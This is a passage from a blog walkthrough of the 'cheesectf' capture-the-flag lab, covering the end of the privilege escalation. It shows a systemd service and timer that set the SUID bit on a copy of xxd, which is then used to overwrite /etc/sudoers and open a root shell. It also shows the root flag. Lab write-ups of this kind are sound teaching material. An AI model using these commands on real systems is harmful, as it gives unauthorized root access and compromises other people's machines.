, <a href="https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/9/html/using_systemd_unit_files_to_customize_and_optimize_your_system/assembly_working-with-systemd-unit-files_working-with-systemd#unit-files-locations_assembly_working-with-systemd-unit-files" target="_blank" rel="noopener">systemd unit files</a>
.</p>
<p>For each timer file, a matching unit file must exist, describing the unit to activate when the timer elapses. By default, a service by the same name as the timer (except for the suffix) is activated. Example: a timer file <code>exploit.timer</code> activates a matching service <code>exploit.service</code>.</p>
<p>The arguments to the directives are time spans configured in seconds. Example: <code>OnBootSec=50</code> means <code>50s after boot-up</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">comte@cheesectf:/etc/systemd/system$ cat exploit.service 
</span></span><span class="line"><span class="cl"><span class="o">[</span>Unit<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="nv">Description</span><span class="o">=</span>Exploit Service
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>Service<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="nv">Type</span><span class="o">=</span>oneshot
</span></span><span class="line"><span class="cl"><span class="nv">ExecStart</span><span class="o">=</span>/bin/bash -c <span class="s2">&#34;/bin/cp /usr/bin/xxd /opt/xxd &amp;&amp; /bin/chmod +sx /opt/xxd&#34;</span>
</span></span></code></pre></div><p>The code above is a service that will be activated by a timer. It performs the following tasks:</p>
<ol>
<li>Copies the <code>/usr/bin/xxd</code> file to the <code>/opt/xxd</code> directory.</li>
<li>Sets the <code>SUID</code> (Set User ID) bit on the <code>/opt/xxd</code> file.</li>
</ol>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>Timer<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="nv">OnBootSec</span><span class="o">=</span><span class="m">0</span>
</span></span></code></pre></div><p>We are going to add <code>0</code> as the value for <code>OnBootSec</code> in <code>exploit.timer</code> file, which means service will be started in <code>0 second</code> delay.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo /bin/systemctl daemon-reload
</span></span><span class="line"><span class="cl">sudo /bin/systemctl start exploit.timer
</span></span></code></pre></div><p>Reloading the daemon services and executing <code>sudo /bin/systemctl start exploit.timer</code> starts the timer without any error.</p>
<h3 id="suid-xxd">SUID (xxd)</h3>
<p>Resources to read: <a href="https://www.geeksforgeeks.org/xxd-command-in-linux/" target="_blank" rel="noopener">geeksforgeeks|xxd</a>
, <a href="https://gtfobins.github.io/gtfobins/xxd/#suid" target="_blank" rel="noopener">GTFOBins|xxd</a>
.</p>
<p><code>xxd</code> is a command-line tool that is primarily used for <code>creating and analyzing hexadecimal dumps</code> from files.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="s2">&#34;hello&#34;</span> <span class="p">|</span> xxd
</span></span><span class="line"><span class="cl">00000000: <span class="m">6865</span> 6c6c 6f0a                           hello.
</span></span></code></pre></div><p>To create a hexadecimal dump of a file, you can use the above command.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="s2">&#34;00000000: 6865 6c6c 6f0a                           hello.&#34;</span> <span class="p">|</span> xxd -r
</span></span><span class="line"><span class="cl">hello
</span></span></code></pre></div><p>Now we used the <code>-r</code> option to reverse this process, converting the hex dump back into its original format.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;hello&#34;</span> <span class="p">|</span> xxd <span class="p">|</span> xxd -r
</span></span><span class="line"><span class="cl">hello
</span></span></code></pre></div><p>No we have used <code>xxd</code> and <code>xxd -r</code> to get the same output as input. We are going to use this technique to get privilege access.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">comte@cheesectf:/etc/systemd/system$ ls -lah /opt/xxd
</span></span><span class="line"><span class="cl">-rwsr-sr-x <span class="m">1</span> root root 19K Sep <span class="m">30</span> 12:33 /opt/xxd
</span></span></code></pre></div><p>Lets confirm that the binary have SUID bit on it.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/opt/xxd /etc/sudoers <span class="p">|</span> /opt/xxd -r &gt; sudoers
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;</span><span class="k">$(</span>whoami<span class="k">)</span><span class="s2"> ALL=(ALL) NOPASSWD: ALL&#34;</span> &gt;&gt; sudoers
</span></span><span class="line"><span class="cl">/opt/xxd sudoers <span class="p">|</span> /opt/xxd -r - /etc/sudoers
</span></span><span class="line"><span class="cl">sudo bash
</span></span></code></pre></div><p>By adding user <code>comte's</code> name in sudoers file getting root access.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@cheesectf:~# cat root.txt 
</span></span><span class="line"><span class="cl">      _                           _       _ _  __
</span></span><span class="line"><span class="cl">  ___<span class="p">|</span> <span class="p">|</span>__   ___  ___  ___  ___  <span class="o">(</span>_<span class="o">)</span>___  <span class="p">|</span> <span class="o">(</span>_<span class="o">)</span>/ _<span class="p">|</span> ___
</span></span><span class="line"><span class="cl"> / __<span class="p">|</span> <span class="err">&#39;</span>_ <span class="se">\ </span>/ _ <span class="se">\/</span> _ <span class="se">\/</span> __<span class="p">|</span>/ _ <span class="se">\ </span><span class="p">|</span> / __<span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span>_ / _ <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span><span class="p">|</span> <span class="o">(</span>__<span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span>  __/  __/<span class="se">\_</span>_ <span class="se">\ </span> __/ <span class="p">|</span> <span class="se">\_</span>_ <span class="se">\ </span><span class="p">|</span> <span class="p">|</span> <span class="p">|</span>  _<span class="p">|</span>  __/
</span></span><span class="line"><span class="cl"> <span class="se">\_</span>__<span class="p">|</span>_<span class="p">|</span> <span class="p">|</span>_<span class="p">|</span><span class="se">\_</span>__<span class="p">|</span><span class="se">\_</span>__<span class="o">||</span>___/<span class="se">\_</span>__<span class="p">|</span> <span class="p">|</span>_<span class="p">|</span>___/ <span class="p">|</span>_<span class="p">|</span>_<span class="p">|</span>_<span class="p">|</span>  <span class="se">\_</span>__<span class="p">|</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">THM<span class="o">{</span>REDACTED<span class="o">}</span>
</span></span></code></pre></div><!--flag2 THM{dca75486094810807faf4b7b0a929b11e5e0167c} -->
<p>The above command gives us the root flag.</p>
<h2 id="extras">Extras</h2>
<pre tabindex="0"><code>www-data@cheesectf:/tmp$ cat /usr/local/bin/twist.sh
iptables -t nat -A PREROUTING -p tcp -m tcp --dport 1:21 -j REDIRECT --to-ports 4444
iptables -t nat -A PREROUTING -p tcp -m tcp --dport 23:79 -j REDIRECT --to-ports 4444
iptables -t nat -A PREROUTING  -p tcp -m tcp --dport 81:65535 -j REDIRECT --to-ports 4444
portspoof -c /usr/local/etc/portspoof.conf -s /usr/local/etc/portspoof_signatures
</code></pre><p><code>/usr/local/bin/twist.sh</code> is responsible for the capturing multiple ports during initial nmap scan.</p>
<p>We solved the lab.</p>
<p>Happy Hacking !!! &#x1f60e;</p>

      </article>

      
      


  
<script type="text/javascript">
  (function() {
    const themeToggle = document.querySelector('.darkmode-toggle input');
    const light = 'light';
    const dark = 'dark';
    let isDark = localStorage.theme === dark || (!('theme' in localStorage) && window.matchMedia('(prefers-color-scheme: dark)').matches);
    let theme = isDark ? dark : light;

    const s = document.createElement('script');
    s.type = 'text/javascript';
    const dataset = {
        repo: 'cyberjagadeesh\/cyberjagadeesh.github.io',
        repoId: 'R_kgDOMfA4MA',
        category: 'General',
        categoryId: 'DIC_kwDOMfA4MM4ChYzn',
        mapping: 'url',
        reactionsEnabled: '1',
        emitMetadata: '0',
        theme: theme,
        lang: 'en',
    };
    s.src = 'https://giscus.app/client.js';
    s.crossorigin = 'anonymous';
    s.async = true;
    Object.entries(dataset).forEach(function(a) {
        return s.dataset[a[0]] = a[1];
    });

    const curScriptElement = document.currentScript;
    curScriptElement.parentNode.insertBefore(s, curScriptElement);

    function sendMessage(message) {
      const iframe = document.querySelector('iframe.giscus-frame');
      
      if (!iframe) return;
      iframe.contentWindow.postMessage({ giscus: message }, 'https://giscus.app');
    }

    themeToggle.addEventListener('change', function () {
      if (this.checked) {
        theme = dark;
      } else {
        theme = light;
      }
      sendMessage({
        setConfig: {
          theme: theme,
        }
      });
    });
  })();
</script>
  


      

    </div>
  </div>
</div>

  </main>
  <footer class="flex flex-none justify-center">
    <section class="flex flex-col md:flex-row mx-2 md:mx-0 gap-2 md:gap-0 justify-between w-full max-w-4xl lg:max-w-5xl py-6 text-slate-500 dark:text-slate-300">
  <div class="flex flex-row">
    
  
  
  
  
  
  
  
  
    <a href="https://www.linkedin.com/in/jagadeeshwaran-m-27598134b" target="_blank" title="LinkedIn" class="flex flex-row mr-2">
      <span class="hidden">LinkedIn</span>
      <i class="h-6 w-6 flex-none"> <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-linkedin" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
   <path d="M4 4m0 2a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v12a2 2 0 0 1 -2 2h-12a2 2 0 0 1 -2 -2z"></path>
   <path d="M8 11l0 5"></path>
   <path d="M8 8l0 .01"></path>
   <path d="M12 16l0 -5"></path>
   <path d="M16 16v-3a2 2 0 0 0 -4 0"></path>
</svg>
 </i>
    </a>
  
  
  
    <a href="https://www.linkedin.com/in/jagadeeshwaran-m-562a011b3" target="_blank" title="LinkedIn" class="flex flex-row mr-2">
      <span class="hidden">LinkedIn</span>
      <i class="h-6 w-6 flex-none"> <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-linkedin" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
   <path d="M4 4m0 2a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v12a2 2 0 0 1 -2 2h-12a2 2 0 0 1 -2 -2z"></path>
   <path d="M8 11l0 5"></path>
   <path d="M8 8l0 .01"></path>
   <path d="M12 16l0 -5"></path>
   <path d="M16 16v-3a2 2 0 0 0 -4 0"></path>
</svg>
 </i>
    </a>
  
  
  
  


  </div>
  <div class="grow"></div>
  <div class="flex flex-row">
    <i class="h-6 w-6 flex-none"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
   <path d="M12 12m-9 0a9 9 0 1 0 18 0a9 9 0 1 0 -18 0"></path>
   <path d="M14 9.75a3.016 3.016 0 0 0 -4.163 .173a2.993 2.993 0 0 0 0 4.154a3.016 3.016 0 0 0 4.163 .173"></path>
</svg>
</i> 2024 - 2025 CyberJagadeesh
    
  </div>
  
</section>

  </footer>
  <script src="/main.js"></script>

<div class="hidden top-1 right-1" id="code-copy">
  <i class="h-6 w-6 block">
    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" />
  <path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" />
</svg>

  </i>
</div>
<div class="hidden top-1 right-1" id="code-copy-done">
  <i class="h-6 w-6 block">
    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-check" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M5 12l5 5l10 -10" />
</svg>

  </i>
</div><script src="/code-copy.js"></script>





</body>
</html>
